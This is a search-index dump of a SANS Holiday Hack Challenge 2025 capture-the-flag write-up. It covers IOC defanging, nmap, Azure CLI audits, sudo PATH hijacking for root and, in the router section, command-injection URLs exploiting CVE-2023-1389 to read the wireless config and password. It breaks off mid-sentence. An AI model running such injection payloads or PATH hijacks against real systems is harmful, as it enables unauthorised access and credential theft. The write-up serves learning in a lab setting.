{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#sans-holiday-hack-challenge-2025-write-up","title":"SANS Holiday Hack Challenge 2025 Write-Up","text":"<p>This is a write-up for the SANS Holiday Hack Challenge 2025. This is a yearly capture-the-flag event organized by the SANS training institute around the holiday period. It is free of charge and played in form of an online multiplayer rpg-like game including a world to walk around freely in where you can meet your peers, NPCs with dialogue, and a storyline, making it a unique CTF.</p> <p>Note</p> <p>This write-up is not complete. Some objectives from Act 3 are missing.</p> <p></p> <p>Multiplayer world to roam around in, this year in 3D!</p>"},{"location":"#challenge-topics-2025","title":"Challenge topics 2025","text":"<p>This year\u2019s challenge covers the following topics, including grand challenges provided by Microsoft and Google: defanging IOCs, using SUDO, port discovery, forensic analysis, basic networking, firewall basics, Nmap basics, CURL basics, IDOR challenge, using POCs, Java deserialization, Quantum computing, reverse engineering, hacking SQLI, Linux and PrivEsc, and WebApp Pentesting.</p>"},{"location":"#personal-note","title":"Personal note","text":""},{"location":"#write-up-information","title":"Write-up information","text":"<p>I have attempted to extract the maximum value of MKDocs Material during writing. You will see structured pages following a consistent design language. Some special features have been used for better readability and clarity:</p>"},{"location":"#admonitions","title":"Admonitions","text":"<p>These have been of great help to call-out side content without interrupting the document flow. You will see various types, with some being collapsed by default.</p> <p>Note</p> <p>Simple note highlighting some information.</p> <p>Objective</p> <p>Objectives will be shown in a question box.</p> <p>Hint</p> <p>Hints provided by the CTF will be shown in a tip box. They can include highlighted text to show what part of the hint triggers me as 'important'.</p> <p>Conversation</p> <p>Character conversations will be shown in a quote box. They can include highlighted text to show what part of the conversation triggers me as 'important'.</p> <p>Answer</p> <p>Final challenge answers will be given in an answer box.</p> <p>AI usage</p> <p>All usage of AI will be highlighted using a special call-out box with the aim to create a better understanding of how it has contributed to the result.</p>"},{"location":"#answer-structure","title":"Answer structure","text":""},{"location":"#code-blocks","title":"Code blocks","text":"Code blocks<pre><code>Where possible, code blocks will be used to clearly denote code, commands, or other challenge artifacts.\nWhen there are lines that are of importance, they will be highlighted like this one.\nWhen there is more to share, annotations will be used, like here. # (1)!\n</code></pre> <ol> <li>They will contain more information.</li> </ol>"},{"location":"act_1/defang/","title":"Defang","text":""},{"location":"act_1/defang/#its-all-about-defang","title":"Its All About Defang","text":"<p>Difficulty: </p>"},{"location":"act_1/defang/#objective","title":"Objective","text":"<p>Task description</p> <p>Find Ed Skoudis upstairs in City Hall and help him troubleshoot a clever phishing tool in his cozy office.</p> Ed Skoudis <p>I'm the Founder of Counter Hack Innovations, the team that brings you the SANS Holiday Hack Challenge for the last 22 years.</p> <p>I'm also the President of the SANS Technology Institute College, which has over 2,300 students studying for their Bachelor's Degrees, Master's Degrees, and various certificates.</p> <p>I was the original author of the SANS SEC504 (Incident Handling and Hacker Attacks) and SANS SEC560 (Enterprise Penetration Testing) courses.</p> <p>I love Capture the Flag games and puzzles.</p> <p>I've got a steampunk office filled with secret rooms, and I collect antique crypto systems and communication technologies.</p> <p>I've got an original Enigma machine (A726, from the early war years), a leaf of the Gutenberg Bible (1 John 2:3 to 4:16) from 1455, and a Kryha Liliput from the 1920s.</p> <p>Oh gosh, I could talk for hours about this stuff but I really need your help!</p> <p>The team has been working on this new SOC tool that helps triage phishing emails...and there are some...issues.</p> <p>We have had some pretty sketchy emails coming through and we need to make sure we block ALL of the indicators of compromise. Can you help me? No pressure...</p> <p>Well you just made that look like a piece of cake! Though I prefer cookies...I know where to find the best in town!</p> <p>Thanks again! See ya 'round!</p>"},{"location":"act_1/defang/#hints","title":"Hints","text":"Defang All The Thingz <p>The PTAS does a pretty good job at defanging, however, the feature we are still working on is one that defangs ALL scenarios. For now, you will need to write a custom sed command combining all defang options.</p> Extract IOCs <p>Remember, the new Phishing Threat Analysis Station (PTAS) is still under construction. Even though the regex patterns are provided, they haven't been fine tuned. Some of the matches may need to be manually removed.</p>"},{"location":"act_1/defang/#solution","title":"Solution","text":"<p>The answers can be found by using various regexes. Regexes for these types of indicators can be found online. Various regexes used to solve this exercise are:</p> <p>Domains:</p> <pre><code>([a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,6}\n</code></pre> <p>IP addresses:</p> <pre><code>(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[0-9]{1,2})(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[0-9]{1,2})){3}\n</code></pre> <p>URLs:</p> <pre><code>((((H|h)(T|t)|(F|f))(T|t)(P|p)((S|s)?))\\://)?(www.|[a-zA-Z0-9].)[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,6}(\\:[0-9]{1,5})*(/($|[a-zA-Z0-9\\.\\,\\;\\?\\'\\\\\\+&amp;amp;%\\$#\\=~_\\-]+))*\n</code></pre> <p>Emails:</p> <pre><code>[0-9a-zA-Z]+([0-9a-zA-Z]*[-._+])*[0-9a-zA-Z]+@[0-9a-zA-Z]+([-.][0-9a-zA-Z]+)*([0-9a-zA-Z]*[.])[a-zA-Z]{2,6}\n</code></pre> <p>Defang using sed:</p> <pre><code>s/:\\//[://]/g;s/http/hxxp/g;s/@/[@]/g;s/\\./[.]/g\n</code></pre> Solution <p></p> <p>Answer to challenge.</p>"},{"location":"act_1/defang/#response","title":"Response","text":"<p>Ed Skoudis</p> <p>finger guns Nice work! You've mastered those firewall fundamentals like a true network security pro.</p> <p>Now that was way more fun than sitting through another boring lecture, wasn't it?</p>"},{"location":"act_1/fire_alarm/","title":"Neighborhood Watch Bypass","text":""},{"location":"act_1/fire_alarm/#neighborhood-watch-bypass","title":"Neighborhood Watch Bypass","text":"<p>Difficulty: </p>"},{"location":"act_1/fire_alarm/#objective","title":"Objective","text":"<p>Task description</p> <p>Assist Kyle at the old data center with a fire alarm that just won't chill.</p> Kyle Parrish <p>If you spot a fire, let me know! I'm Kyle, and I've been around the Holiday Hack Challenge scene for years as arnydo - picked up multiple Super Honorable Mentions along the way.</p> <p>When I'm not fighting fires or hunting vulnerabilities, you'll find me on a unicycle or juggling - I once showed up a professional clown with his own clubs!</p> <p>My family and I love exploring those East Tennessee mountains, and honestly, geocaching teaches you a lot about finding hidden things - useful in both firefighting and hacking.</p> <p>Anyway, I could use some help here. This fire alarm keeps going nuts but there's no fire. I checked.</p> <p>I think someone has locked us out of the system. Can you see if you can get back in?</p>"},{"location":"act_1/fire_alarm/#hints","title":"Hints","text":"Path Hijacking <p>Be careful when writing scripts that allow regular users to run them. One thing to be wary of is not using full paths to executables...these can be hijacked.</p> What Are My Powers? <p>You know, Sudo is a REALLY powerful tool. It allows you to run executables as ROOT!!! There is even a handy switch that will tell you what powers your user has.</p>"},{"location":"act_1/fire_alarm/#solution","title":"Solution","text":"<p>We need to execute the script <code>runtoanswer</code> as root to solve this challenge.</p> <p>We can check allowed commands for the invoking user using <code>sudo -l</code> (see hints):</p> <pre><code>\ud83c\udfe0 chiuser @ Dosis Neighborhood ~ \ud83d\udd0d $ sudo -l\nMatching Defaults entries for chiuser on 7ff5c7a0bc86:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, secure_path=/home/chiuser/bin\\:/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=\"API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME\", env_keep+=PATH\n\nUser chiuser may run the following commands on 7ff5c7a0bc86:\n    (root) NOPASSWD: /usr/local/bin/system_status.sh\n</code></pre> <p>This shows us that we can run a script named <code>system_status.sh</code> as root. Let's have a look what this script contains:</p> <pre><code>\ud83c\udfe0 chiuser @ Dosis Neighborhood ~/bin \ud83d\udd0d $ cat /usr/local/bin/system_status.sh\n#!/bin/bash\necho \"=== Dosis Neighborhood Fire Alarm System Status ===\"\necho \"Fire alarm system monitoring active...\"\necho \"\"\necho \"System resources (for alarm monitoring):\"\nfree -h\necho -e \"\\nDisk usage (alarm logs and recordings):\"\ndf -h\necho -e \"\\nActive fire department connections:\"\nw\necho -e \"\\nFire alarm monitoring processes:\"\nps aux | grep -E \"(alarm|fire|monitor|safety)\" | head -5 || echo \"No active fire monitoring processes detected\"\necho \"\"\necho \"\ud83d\udd25 Fire Safety Status: All systems operational\"\necho \"\ud83d\udea8 Emergency Response: Ready\"\necho \"\ud83d\udccd Coverage Area: Dosis Neighborhood (all sectors)\"\n</code></pre> <p>We see usage of commands such as <code>free</code> and <code>df</code> without pointing to the actual binary, meaning the script relies on the <code>$PATH</code> variable to find the correct binaries. By creating our own malicious binary with the same name and placing it in a folder that listed before the folder of the legitimate binary in <code>$PATH</code>, we can hijack the execution. Since we can execute the script as root, we can then also execute other commands as root. This is called Path Hijacking.</p> <p>The <code>$PATH</code> variable looks as follows:</p> <pre><code>\ud83c\udfe0 chiuser @ Dosis Neighborhood ~ \ud83d\udd0d $ $PATH\nbash: /home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory\n</code></pre> <p>We see that the <code>bin</code> folder in the user's home folder is checked first. Since we are logged in as that user, we can place our binary in there. Let's test this functionality with a placeholder command <code>echo</code>:</p> <pre><code>\ud83c\udfe0 chiuser @ Dosis Neighborhood ~/bin \ud83d\udd0d $ echo \"echo 'path hijack'\" &gt; free\n\ud83c\udfe0 chiuser @ Dosis Neighborhood ~/bin \ud83d\udd0d $ chmod +x free\n\ud83c\udfe0 chiuser @ Dosis Neighborhood ~/bin \ud83d\udd0d $ /usr/local/bin/system_status.sh\n=== Dosis Neighborhood Fire Alarm System Status ===\nFire alarm system monitoring active...\n\nSystem resources (for alarm monitoring):\npath hijack\n\n...\n</code></pre> Solution <p>Using Path Hijacking, we can execute the <code>./runtoanswer</code> binary as root and solve the challenge:</p> <pre><code>\ud83c\udfe0 chiuser @ Dosis Neighborhood ~/bin \ud83d\udd0d $ echo \"echo './runtoanswer'\" &gt; free\n\ud83c\udfe0 chiuser @ Dosis Neighborhood ~/bin \ud83d\udd0d $ sudo /usr/local/bin/system_status.sh\n</code></pre>"},{"location":"act_1/fire_alarm/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_1/fire_alarm/#response","title":"Response","text":"<p>Kyle Parrish</p> <p>Wow! Thank you so much! I didn't realize seudo was so powerful. Especially when misconfigured. Who knew a simple privilege escalation could unlock the whole fire safety system?</p> <p>Now... will you sudo make me a sandwich?</p>"},{"location":"act_1/intro_to_nmap/","title":"Intro to Nmap","text":""},{"location":"act_1/intro_to_nmap/#intro-to-nmap","title":"Intro to Nmap","text":"<p>Difficulty: </p>"},{"location":"act_1/intro_to_nmap/#objective","title":"Objective","text":"<p>Task description</p> <p>Meet Eric in the hotel parking lot for Nmap know-how and scanning secrets. Help him connect to the wardriving rig on his motorcycle!</p> Eric Pursley <p>Hey, I'm Eric. As you can see, I'm an avid motorcyclist. And I love traveling the world with my wife.</p> <p>I enjoy being creative and making things. For example, a cybersecurity tool called Zero-E that I'm quite proud of, and the Baldur's Gate 3 mod called Manaflare. I'm even in the BG3 credits!</p> <p>I also make tools, ranges, and HHC worlds for Counter Hack. Yup, including the one you're in right now.</p> <p>But most of the time, I'm helping organizations in the real world be more secure. I do a bunch of different kinds of pentesting, but speciailize in network and physical.</p> <p>Some advice: stay laser-focused on your goals and don't let the distractions life throws at you lead you astray. That's how I ended up at Counter Hack!</p> <p>Speaking of tools, let me introduce you to one of the most essential weapons in any pentester's arsenal: Nmap.</p> <p>It's like having X-ray vision for networks, and I've set up a perfect environment for you to learn the fundamentals.</p> <p>Help me find and connect to the wardriving rig's service on my motorcycle!</p>"},{"location":"act_1/intro_to_nmap/#hints","title":"Hints","text":"Nmap Documentation <p>Nmap is pretty straightforward to use for basic port scans. Check out its documentation!</p> Ncat Documentation <p>You may also want to check out the Ncat Guide.</p>"},{"location":"act_1/intro_to_nmap/#solution","title":"Solution","text":"Solution <p>We need to execute the following commands:</p> <pre><code>nmap 127.0.12.25\nnmap -p- 127.0.12.25\nnmap 127.0.12.20-28\nnmap -p 8080 -sC 127.0.12.25\nnmap -p 8080 -sV 127.0.12.25\nnc 127.0.12.25 24601\nexit\n</code></pre>"},{"location":"act_1/intro_to_nmap/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_1/intro_to_nmap/#response","title":"Response","text":"<p>Eric Pursley</p> <p>Excellent work! You've got the Nmap fundamentals down - that X-ray vision is going to serve you well in future challenges.</p> <p>Now you're ready to scan networks like a seasoned pentester!</p>"},{"location":"act_1/owner/","title":"Owner","text":""},{"location":"act_1/owner/#owner","title":"Owner","text":"<p>Difficulty: </p>"},{"location":"act_1/owner/#objective","title":"Objective","text":"<p>Task description</p> <p>Help Goose James near the park discover the accidentally leaked SAS token in a public JavaScript file and determine what Azure Storage resource it exposes and what permissions it grants.</p> James <p>CLUCK CLU... I think I might be losing my mind. All the elves are gone and I'm still hearing voices.</p> <p>The Neighborhood HOA uses Azure for their IT infrastructure.</p> <p>The Neighborhood network admins use RBAC fo access control.</p> <p>Your task is to audit their RBAC configuration to ensure they're following security best practices.</p> <p>They claim all elevated access uses PIM, but you need to verify there are no permanently assigned Owner roles.</p>"},{"location":"act_1/owner/#hints","title":"Hints","text":"Owner <p>This terminal has built-in hints!</p>"},{"location":"act_1/owner/#solution","title":"Solution","text":"Solution <p>We need to execute the following commands:</p> <pre><code>az account list --query \"[].name\"\naz account list --query \"[?state=='Enabled'].{Name:name, ID:id}\"\naz role assignment list --scope \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64\" --query [?roleDefinition=='Owner']\naz role assignment list --scope \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617\" --query [?roleDefinition=='Owner']\naz ad member list --group \"6b982f2f-78a0-44a8-b915-79240b2b4796\"\naz ad member list --group \"631ebd3f-39f9-4492-a780-aef2aec8c94e\"\nfinish\n</code></pre>"},{"location":"act_1/owner/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_1/owner/#response","title":"Response","text":"<p>James</p> <p>You found the permanent assignments! CLUCK! See, I'm not crazy - the security really WAS misconfigured. Now maybe I can finally get some peace and quiet...</p>"},{"location":"act_1/santas_gift_tracking/","title":"Santa's Gift-Tracking Service Port Mystery","text":""},{"location":"act_1/santas_gift_tracking/#santas-gift-tracking-service-port-mystery","title":"Santa's Gift-Tracking Service Port Mystery","text":"<p>Difficulty: </p>"},{"location":"act_1/santas_gift_tracking/#objective","title":"Objective","text":"<p>Task description</p> <p>Chat with Yuri near the apartment building about Santa's mysterious gift tracker and unravel the holiday mystery.</p> Yuri <p>Hi! I'm Yori.</p> <p>I was Ed's lost intern back in 2015, but I was found!</p> <p>Think you can check out this terminal for me? I need to use cURL to access the gift tracker system, but it has me stumped.</p> <p>Please see what you can do!</p>"},{"location":"act_1/santas_gift_tracking/#hints","title":"Hints","text":"Web Requests without a Browser?? <p>Since we don't have a web browser to connect to this HTTP service...There is another common tool that you can use from the cli.</p> Who is Netstat? <p>Back in my day...we just used Netstat. I hear <code>ss</code> is the new kid on the block. A lot of the parameters are the same too...such as listing only the ports that are currenting LISTENING on the system.</p>"},{"location":"act_1/santas_gift_tracking/#solution","title":"Solution","text":"Solution <p>We need to execute the following commands:</p> <pre><code>ss -tlnp\ncurl 0.0.0.0:12321\n</code></pre>"},{"location":"act_1/santas_gift_tracking/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_1/santas_gift_tracking/#response","title":"Response","text":"<p>Yuri</p> <p>Great work - thank you!</p> <p>Geez, maybe you can be my intern now!</p>"},{"location":"act_1/spare_key/","title":"Spare Key","text":""},{"location":"act_1/spare_key/#spare-key","title":"Spare Key","text":"<p>Difficulty: </p>"},{"location":"act_1/spare_key/#objective","title":"Objective","text":"<p>Task description</p> <p>Help Goose Barry near the pond identify which identity has been granted excessive Owner permissions at the subscription level, violating the principle of least privilege.</p> Barry <p>You want me to say what exactly? Do I really look like someone who says MOOO?</p> <p>The Neighborhood HOA hosts a static website on Azure Storage.</p> <p>An admin accidentally uploaded an infrastructure config file that {=contains a long-lived SAS token.=}</p> <p>Use Azure CLI to find the leak and report exactly where it lives.</p>"},{"location":"act_1/spare_key/#hints","title":"Hints","text":"Spare Key <p>This terminal has built-in hints!</p>"},{"location":"act_1/spare_key/#solution","title":"Solution","text":"Solution <p>We need to execute the following commands:</p> <pre><code>az group list -o table\naz storage account list --resource-group rg-the-neighborhood -o table\naz storage blob service-properties show --account-name neighborhoodhoa --auth-mode login\naz storage container list --account-name neighborhoodhoa --auth-mode login\naz storage blob list --account-name neighborhoodhoa --container-name '$web' --auth-mode login\naz storage blob download --account-name neighborhoodhoa --container-name '$web' --name iac/terraform.tfvars --file /dev/stdout | less\nfinish\n</code></pre> <p>Look for this object: </p><pre><code>  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg1/providers/Microsoft.Storage/storageAccounts/neighborhood2\",\n    \"kind\": \"StorageV2\",\n    \"location\": \"eastus2\",\n    \"name\": \"neighborhood2\",\n    \"properties\": {\n      \"accessTier\": \"Cool\",\n      \"allowBlobPublicAccess\": true,\n      \"encryption\": {\n        \"keySource\": \"Microsoft.Storage\",\n        \"services\": {\n          \"blob\": {\n            \"enabled\": false\n          }\n        }\n      },\n      \"minimumTlsVersion\": \"TLS1_0\"\n    },\n    \"resourceGroup\": \"theneighborhood-rg1\",\n    \"sku\": {\n      \"name\": \"Standard_GRS\"\n    },\n    \"tags\": {\n      \"owner\": \"Admin\"\n    }\n  },\n</code></pre><p></p>"},{"location":"act_1/spare_key/#response","title":"Response","text":"<p>Barry</p> <p>There it is. A SAS token with read-write-delete permissions, publicly accessible. At least someone around here knows how to do a proper security audit.</p>"},{"location":"act_1/storage_secrets/","title":"Blob Storage Challenge in the Neighborhood","text":""},{"location":"act_1/storage_secrets/#blob-storage-challenge-in-the-neighborhood","title":"Blob Storage Challenge in the Neighborhood","text":"<p>Difficulty: </p>"},{"location":"act_1/storage_secrets/#objective","title":"Objective","text":"<p>Task description</p> <p>Help the Goose Grace near the pond find which Azure Storage account has been misconfigured to allow public blob access by analyzing the export file.</p> Grace <p>HONK!!! HONK!!!!</p> <p>The Neighborhood HOA uses Azure storage accounts for various IT operations.</p> <p>You've been asked to audit their storage security configuration to ensure no sensitive data is publicly accessible.</p> <p>Recent security reports suggest some storage accounts {=might have public blob access enabled, creating potential data exposure risks.=}</p>"},{"location":"act_1/storage_secrets/#hints","title":"Hints","text":"Blob Storage Challenge in the Neighborhood <p>This terminal has built-in hints!</p>"},{"location":"act_1/storage_secrets/#solution","title":"Solution","text":"Solution <p>We need to execute the following commands:</p> <p></p><pre><code>az help | less\naz account show | less\naz storage account list | less\naz storage account show --name neighborhood2 | less\naz storage container list --account-name neighborhood2\naz storage blob list --account-name neighborhood2 --container-name public\naz storage blob download --account-name neighborhood2 --container-name public --name admin_credentials.txt --file /dev/stdout | less\nfinish\n</code></pre> Look for the following object:<p></p> <pre><code>  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg1/providers/Microsoft.Storage/storageAccounts/neighborhood2\",\n    \"kind\": \"StorageV2\",\n    \"location\": \"eastus2\",\n    \"name\": \"neighborhood2\",\n    \"properties\": {\n      \"accessTier\": \"Cool\",\n      \"allowBlobPublicAccess\": true,\n      \"encryption\": {\n        \"keySource\": \"Microsoft.Storage\",\n        \"services\": {\n          \"blob\": {\n            \"enabled\": false\n          }\n        }\n      },\n      \"minimumTlsVersion\": \"TLS1_0\"\n    },\n    \"resourceGroup\": \"theneighborhood-rg1\",\n    \"sku\": {\n      \"name\": \"Standard_GRS\"\n    },\n    \"tags\": {\n      \"owner\": \"Admin\"\n    }\n  },\n</code></pre>"},{"location":"act_1/storage_secrets/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_1/storage_secrets/#response","title":"Response","text":"<p>Grace</p> <p>HONK HONK HONK! 'No sensitive data publicly accessible' they claimed. Meanwhile, literally everything was public! Good save, security expert!</p>"},{"location":"act_1/the_open_door/","title":"The Open Door","text":""},{"location":"act_1/the_open_door/#the-open-door","title":"The Open Door","text":"<p>Difficulty: </p>"},{"location":"act_1/the_open_door/#objective","title":"Objective","text":"<p>Task description</p> <p>Help Goose Lucas in the hotel parking lot find the dangerously misconfigured Network Security Group rule that's allowing unrestricted internet access to sensitive ports like RDP or SSH.</p> Lucas <p>(Spanish mode) Hi... welcome to the Dosis Neighborhood! Nice to meet you!</p> <p>Please make sure the towns Azure network is secured properly.</p> <p>The Neighborhood HOA uses Azure for their IT infrastructure.</p> <p>Audit their network security configuration to ensure production systems aren't exposed to internet attacks.</p> <p>They claim all systems are properly protected, but you need to {=verify there are no overly permissive NSG rules.=}</p>"},{"location":"act_1/the_open_door/#hints","title":"Hints","text":"The Open Door <p>This terminal has built-in hints!</p>"},{"location":"act_1/the_open_door/#solution","title":"Solution","text":"Solution <p>We need to execute the following commands:</p> <pre><code>az group list\naz group list -o table\naz network nsg list -o table\naz network nsg show --name nsg-web-eastus --resource-group theneighborhood-rg1 | less\naz network nsg rule list --nsg-name nsg-mgmt-eastus --resource-group theneighborhood-rg2 | less\naz network nsg rule list --nsg-name nsg-production-eastus --resource-group theneighborhood-rg1 | less\naz network nsg rule show --nsg-name nsg-production-eastus --resource-group theneighborhood-rg1 --name Allow-RDP-From-Internet | less\nfinish\n</code></pre>"},{"location":"act_1/the_open_door/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_1/the_open_door/#response","title":"Response","text":"<p>Lucas</p> <p>Ha! 'Properly protected' they said. More like 'properly exposed to the entire internet'! Good catch, amigo.</p>"},{"location":"act_1/visual_firewall/","title":"Visual Firewall Thinger","text":""},{"location":"act_1/visual_firewall/#visual-firewall-thinger","title":"Visual Firewall Thinger","text":"<p>Difficulty: </p>"},{"location":"act_1/visual_firewall/#objective","title":"Objective","text":"<p>Task description</p> <p>Find Elgee in the big hotel for a firewall frolic and some techy fun.</p> Chris Elgee <p>Oh hi! Am I on the road again? I should buy souvenirs for the family.</p> <p>Loud shirts? Love them. Because - hey, if you aren't having fun, what are you even doing??</p> <p>And yes, finger guns are 100% appropriate for military portraits.</p> <p>... We should get dessert soon!</p> <p>Welcome to my little corner of network security! finger guns</p> <p>I've whipped up something sweeter than my favorite whoopie pie - an interactive firewall simulator that'll teach you more in ten minutes than most textbooks do in ten chapters.</p> <p>Don't worry about breaking anything; that's half the fun of learning!</p> <p>Ready to dig in?</p>"},{"location":"act_1/visual_firewall/#hints","title":"Hints","text":"Visual Firewall Thinger <p>This terminal has built-in hints!</p>"},{"location":"act_1/visual_firewall/#solution","title":"Solution","text":"<p>We need to configure the firewall correctly according to the configuration goals using the GUI. The settings should be as follows:</p> Solution for Cloud Services <p></p> <p>Solution for Cloud Services.</p> Solution for DMZ <p></p> <p>Solution for DMZ.</p> Solution for Internal <p></p> <p>Solution for Internal.</p> Solution for Internet <p></p> <p>Solution for Internet.</p> Solution for Workstations <p></p> <p>Solution for Workstations.</p>"},{"location":"act_1/visual_firewall/#images","title":"Images","text":"<p>Challenge GUI.</p>"},{"location":"act_1/visual_firewall/#response","title":"Response","text":"<p>Chris Elgee</p> <p>finger guns Nice work! You've mastered those firewall fundamentals like a true network security pro.</p> <p>Now that was way more fun than sitting through another boring lecture, wasn't it?</p>"},{"location":"act_1/visual_networking/","title":"Visual Networking Thinger","text":""},{"location":"act_1/visual_networking/#visual-networking-thinger","title":"Visual Networking Thinger","text":"<p>Difficulty: </p>"},{"location":"act_1/visual_networking/#objective","title":"Objective","text":"<p>Task description</p> <p>Skate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.</p> Jared Folkins <p>Well hello there! I'm Bow Ninecandle, bright as a twinkling star! Everyone's busy unpacking, but I've grown quite bored of that. Care to join me for a lovely game?</p> <p>Oh Joy! Today, We're diving into something delightful: the curling challenge\u2014without any ice, but plenty of sparkle!</p> <p>No icy brooms here though! We're all about Curl, sending web requests from the command line like magic messages.</p> <p>So, have you ever wielded Curl before? If not, no worries at all, my friend!</p> <p>It's this clever little tool that lets you whisper directly to web servers. Pretty neat, right?</p> <p>Think of it like sending secret scrolls through the interwebs, awaiting a wise reply!</p> <p>To begin, you can type something like curl https://example.com. Voil\u00e0! The HTML of the page appears, like conjuring a spell!</p> <p>Simple enough, huh? But oh, there's a whole world of magic you can cast with Curl!</p> <p>We're just brushing the surface here, but trust me\u2014it\u2019s a hoot and a half!</p> <p>If you get tangled up or need help, just give me a shout! I\u2019m here to help you ace this curling spectacle.</p> <p>So, are you ready to curl those web requests like a pro? Let\u2019s see your magic unfold!</p>"},{"location":"act_1/visual_networking/#hints","title":"Hints","text":"Visual Firewall Thinger <p>This terminal has built-in hints!</p>"},{"location":"act_1/visual_networking/#solution","title":"Solution","text":"<p>This challenge presents us a website where we have to simulate typical network requests. The solutions are as follows:</p> Solution to question 1 <p></p> <p>Solution to question 1.</p> Solution to question 2 <p></p> <p>Solution to question 2.</p> Solution to question 3 <p></p> <p>Solution to question 3.</p> Solution to question 4 <p></p> <p>Solution to question 4.</p> Solution to question 5 <p></p> <p>Solution to question 5.</p>"},{"location":"act_1/visual_networking/#images","title":"Images","text":"<p>Challenge GUI.</p>"},{"location":"act_1/visual_networking/#response","title":"Response","text":"<p>Jared Folkins</p> <p>Wonderful! You've mastered those networking basics beautifully.</p> <p>Now you can see how all the pieces of the network puzzle fit together - it's truly better to give knowledge than to keep it to yourself!</p>"},{"location":"act_2/dosis_network_down/","title":"Dosis Network Down","text":""},{"location":"act_2/dosis_network_down/#dosis-network-down","title":"Dosis Network Down","text":"<p>Difficulty: </p>"},{"location":"act_2/dosis_network_down/#objective","title":"Objective","text":"<p>Task description</p> <p>Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?</p> Janusz Jasinski <p>Hello! I'm JJ. I like rock, metal, and punk music. That's all I have to say about that.</p> <p>I accept BTC.</p> <p>Skeletor is my hero!</p> <p>Alright then. Those bloody gnomes 'ave proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.</p> <p>Now I can't get online and it's doing me 'ead in, innit?</p> <p>We own this router, so we're just takin' back what's ours, yeah?</p> <p>You reckon you can 'elp me 'ack past whatever chaos these little blighters left be'ind?</p>"},{"location":"act_2/dosis_network_down/#hints","title":"Hints","text":"Version <p>I can't believe nobody created a backup account on our main router...the only thing I can think of is to check the version number of the router to see if there are any...ways around it...</p> UCI <p>You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.</p>"},{"location":"act_2/dosis_network_down/#solution","title":"Solution","text":"<p>The hints suggest that we have to look for a known vulnerability for this type of router. Using the version number listed on the webpage we can find an exploit for CVE-2023-1389.</p> <p>The webpage also contains this code that hints as looking for a debug endpoint:</p> <pre><code>if (attempts &gt;= 3) {\n  // Show special message after 3 attempts\n  errorDiv.textContent = \"Too many failed attempts. Try the debug console.\";\n}\n\n// Add to console a hint for challenge\nconsole.log(\n  \"Debug: Authentication failed. Have you tried checking the network for a debug endpoint?\"\n);\n</code></pre> <p>Since the exploit uses a vulnerability in the LuCi interface and this is related to configuration, we are likely looking at the correct vulnerability. We can use this to get the password of the router.</p> <p>We do not need run the exact exploit mentioned before. We can craft exploit URLs ourselves.</p> Solution <p>We craft the following URLs to exploit the vulnerability: Note: we need to submit the URL twice to run the command (see commend on Exploit-DB.)</p> <p>Verify that exploit works: </p><pre><code>https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(ls)\n</code></pre><p></p> <p>Collect wireless config: </p><pre><code>https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cat%20/etc/config/wireless)\n\nconfig wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!'\n</code></pre><p></p> <p>The password is <code>SprinklesAndPackets2025</code>.</p>"},{"location":"act_2/dosis_network_down/#response","title":"Response","text":"<p>Janusz Jasinski</p> <p>Brilliant work, that. Got me connection back and sent those gnomes packin' from the router.</p> <p>Now I can finally get back to streamin' some proper metal. BTC tips accepted, by the way.</p>"},{"location":"act_2/gnome_identity/","title":"Rogue Gnome Identity Provider","text":""},{"location":"act_2/gnome_identity/#rogue-gnome-identity-provider","title":"Rogue Gnome Identity Provider","text":"<p>Difficulty: </p>"},{"location":"act_2/gnome_identity/#objective","title":"Objective","text":"<p>Task description</p> <p>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</p> Paul Beckett <p>Hey, I\u2019m Paul!</p> <p>I\u2019ve been at Counter Hack since 2024 and loving every minute of it.</p> <p>I\u2019m a pentester who digs into web, API, and mobile apps, and I\u2019m also a fan of Linux.</p> <p>When 